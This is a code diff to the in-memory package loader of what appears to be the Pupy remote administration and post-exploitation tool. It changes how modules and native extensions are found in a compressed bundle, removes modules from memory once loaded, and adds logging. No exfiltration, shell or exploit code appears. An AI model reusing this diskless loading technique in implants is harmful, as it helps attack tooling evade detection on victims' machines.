@@ -67,7 +67,6 @@ def pupy_add_package(pkdic, compressed=False):
 
     global modules
 
-
     if compressed:
         pkdic = zlib.decompress(pkdic)
 
@@ -147,9 +146,11 @@ class PupyPackageLoader:
                 mod.__loader__ = self
                 mod.__package__ = fullname.rsplit('.',1)[0]
                 sys.modules[fullname]=mod
+
         except Exception as e:
             if fullname in sys.modules:
                 del sys.modules[fullname]
+
             import traceback
             exc_type, exc_value, exc_traceback = sys.exc_info()
             traceback.print_tb(exc_traceback)
@@ -172,7 +173,7 @@ class PupyPackageFinder:
         try:
             files=[]
             if fullname in ( 'pywintypes', 'pythoncom' ):
-                fullname = fullname + "%d%d.dll" % sys.version_info[:2]
+                fullname = fullname + '27.dll'
                 files = [ fullname ]
             else:
                 files = get_module_files(fullname)
@@ -180,7 +181,7 @@ class PupyPackageFinder:
             dprint('find_module({},{}) in {})'.format(fullname, path, files))
             if not builtin_memimporter:
                 files = [
-                    f for f in files if not f.lower().endswith((".pyd",".dll",".so"))
+                    f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
                 ]
 
             if not files:
@@ -215,11 +216,20 @@ class PupyPackageFinder:
             if not selected:
                 dprint('{} not found in {}: not in {} files'.format(
                     fullname, selected, len(files)))
+                return None
 
             dprint('{} found in {}'.format(fullname, selected))
             content = self.modules[selected]
+
+            # Don't delete network.conf module
+            if not selected.startswith('network/'):
+                dprint('{} remove {} from bundle'.format(fullname, selected))
+                del self.modules[selected]
+
             extension = selected.rsplit(".",1)[1].strip().lower()
-            is_pkg = any([selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]])
+            is_pkg = any([
+                selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]
+            ])
 
             dprint('--> Loading {} ({}) package={}'.format(
                 fullname, selected, is_pkg))
@@ -227,7 +237,9 @@ class PupyPackageFinder:
             return PupyPackageLoader(fullname, content, extension, is_pkg, selected)
 
         except Exception as e:
+            dprint('--> Loading {} failed: {}'.format(fullname, e))
             raise e
+
         finally:
             imp.release_lock()
 
